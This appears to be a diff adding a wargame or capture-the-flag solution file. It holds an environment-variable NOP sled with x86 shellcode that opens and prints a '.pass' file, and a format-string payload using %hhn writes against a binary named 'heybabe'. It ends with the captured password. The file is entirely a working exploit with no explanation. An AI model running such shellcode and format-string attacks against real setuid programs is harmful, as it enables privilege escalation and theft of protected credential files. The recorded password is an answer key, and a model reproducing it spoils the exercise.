@@ -1,0 +1,8 @@
+export EGG=$(perl -e 'print "\x90"x(10000 - 2048*4 -14),"jdhsworh/pashvel8he/leh/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80"')
+
+./heybabe $'(\x97\x04\x08AAAA)\x97\x04\x08BBBB*\x97\x04\x08CCCC+\x97\x04\x08DDDD%c%c%c%c%c%c%c%c%000048c%hhn%000162c%hhn%000005c%hhn%000192c%hhn'  
+
+Password:
+n0s3crets
+
+
